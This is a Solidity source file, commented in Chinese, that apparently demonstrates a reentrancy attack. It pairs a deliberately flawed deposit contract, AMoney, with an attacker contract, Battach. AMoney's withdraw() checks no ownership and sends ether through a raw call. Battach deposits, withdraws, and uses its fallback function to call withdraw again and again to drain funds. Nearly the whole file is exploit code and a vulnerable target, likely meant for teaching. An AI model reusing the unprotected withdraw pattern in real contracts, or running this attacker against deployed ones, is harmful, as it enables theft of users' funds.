pragma solidity ^0.4.25;

contract AMoney{
     
        mapping(address => uint256) balances;     //创建字典 用户地址key，用户存入ether为value 
         // 存入 ether 到AMnoey合约中   
        function deposit() payable public {
                balances[msg.sender] += msg.value;
        }
        // 查看当前调用者在AMoney合约中的ether数
       function getMoney() public view returns(uint256){
                return balances[msg.sender];
       }
       
        // 查看目标用户中存如AMoney合约中的ether数
        function getMoney(address add)public view  returns(uint){
                return balances[add];
        }
       
        // 用户从AMoney合约中取出 ether
       function withdraw(address add, uint amount) public{
            // 判断用户在当前合约中存入的 ether数是否大于 要取出的 ether数
            require(balances[add] > amount);
            
            balances[add] -= amount;
            
            // 向用户地址发送 ether 
            add.call.value(amount)();
            // AMnoey合约中 减去取出的 ether 
       }
}
contract Battach{
 
    address amoney;
    address owner;
    uint256 money;
    modifier ownerOnly {
        require(owner == msg.sender);
        _;
    }
    // 构造函数初始化合约所有者的地址
    constructor() public payable {
        owner = msg.sender;
        money = msg.value;
    }
 
    // 保存AMoney合约的地址 以备后续调用
    function setAddre(address add) public{
        amoney = add;
    }
    //开始攻击合约AMoney
    function startattach() ownerOnly public payable{
        // 向合约AMoney中存入 ether
        amoney.call.value(msg.value)(bytes4(keccak256("deposit()")));
        // 从合约AMoney中取出 存入的 ether/2  ,这里使用的是call 所以会调用 fallback
        amoney.call(bytes4(keccak256("withdraw(address,uint256)")),this,money/2);
    }
    // 销毁合约，相当于C++里的析构
    function stopattach() public ownerOnly{
        selfdestruct(owner);
    }
 
    // fallback 函数
    function () public payable{
        // 这里是为了判断调用栈地址是否为 AMoney
        if(msg.sender == amoney){
            // 从合约AMoney中取出 ether,然后继续调用 fallback函数。相当于递归。
            amoney.call(bytes4(keccak256("withdraw(address,uint256)")),this,msg.value);
        }    
 
    }
 
}
